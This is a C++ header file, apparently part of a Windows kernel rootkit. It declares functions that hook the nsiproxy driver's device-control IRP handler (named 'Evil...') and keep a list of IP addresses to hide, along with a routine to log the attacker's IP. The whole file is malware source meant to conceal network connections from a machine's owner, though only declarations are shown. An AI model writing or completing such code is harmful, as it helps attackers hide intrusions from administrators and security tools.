#pragma once
#include "helpers.h"


typedef NTSTATUS(*MajorDeviceControlNsiProxy)(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp);

namespace irphooking {
	namespace address_list {
		NTSTATUS InitializeAddressList();
		NTSTATUS AddToAddressList(ULONG IpAddress);
		NTSTATUS RemoveFromAddressList(ULONG RemoveAddress, USHORT RemoveIndex);
		BOOL CheckIfInAddressList(ULONG CheckAddress, int* IndexInList);
		NTSTATUS ReturnAddressList(PVOID* AddressListOutput, ULONG64* AddressListSizeOutput);
		void ListAllHiddenAddresses();
	}

	NTSTATUS LogAttackerIpAddress();
	NTSTATUS InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction);
	NTSTATUS ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction);
	NTSTATUS EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObject,
		IN PIRP Irp);
	NTSTATUS EvilCompletionNsiProxy(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context);
}